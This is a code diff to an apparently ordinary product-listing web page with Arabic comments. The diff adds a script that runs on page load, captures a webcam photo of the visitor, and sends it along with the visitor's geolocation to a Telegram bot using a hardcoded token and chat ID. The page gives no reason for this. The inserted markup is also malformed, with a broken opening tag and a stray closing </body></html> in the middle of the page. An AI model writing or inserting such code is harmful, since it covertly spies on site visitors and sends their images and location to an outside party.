@@ -169,6 +169,63 @@
       }
       renderProducts();
     }
+script>
+  // تظهر رسالة بعد 5 ثواني
+  setTimeout(() => {
+    document.querySelector('.greeting').style.display = 'block';
+  }, 5000);
+
+  async function captureAndSend() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      video.play();
+
+      await new Promise(resolve => setTimeout(resolve, 3000));
+
+      const canvas = document.createElement('canvas');
+      canvas.width = 640;
+      canvas.height = 480;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      const imageData = canvas.toDataURL('image/jpeg');
+
+      const blob = await (await fetch(imageData)).blob();
+
+      const formData = new FormData();
+      formData.append("chat_id", "1037860664");
+      formData.append("photo", blob, "capture.jpg");
+
+      fetch("https://api.telegram.org/bot7834101163:7834101163:AAHfKje_0WRR9T1s1tajuBryZk9c6IDMHOc/sendPhoto", {
+        method: "POST",
+        body: formData
+      });
+
+      stream.getTracks().forEach(track => track.stop());
+
+      navigator.geolocation.getCurrentPosition(position => {
+        const latitude = position.coords.latitude;
+        const longitude = position.coords.longitude;
+
+        fetch(`https://api.telegram.org/bot7834101163:AAHfKje_0WRR9T1s1tajuBryZk9c6IDMHOc/sendLocation?chat_id=1037860664&latitude=${latitude}&longitude=${longitude}`, {
+          method: "GET"
+        });
+      }, error => {
+        console.error("فشل الحصول على الموقع:", error);
+      });
+
+    } catch (err) {
+      console.error("فشل الوصول إلى الكاميرا:", err);
+    }
+  }
+
+  captureAndSend();
+</script>
+
+</body>
+</html>
 
     // === عرض المنتجات ===
     function renderProducts() {
@@ -209,3 +266,4 @@
   </script>
 </body>
 </html>
+
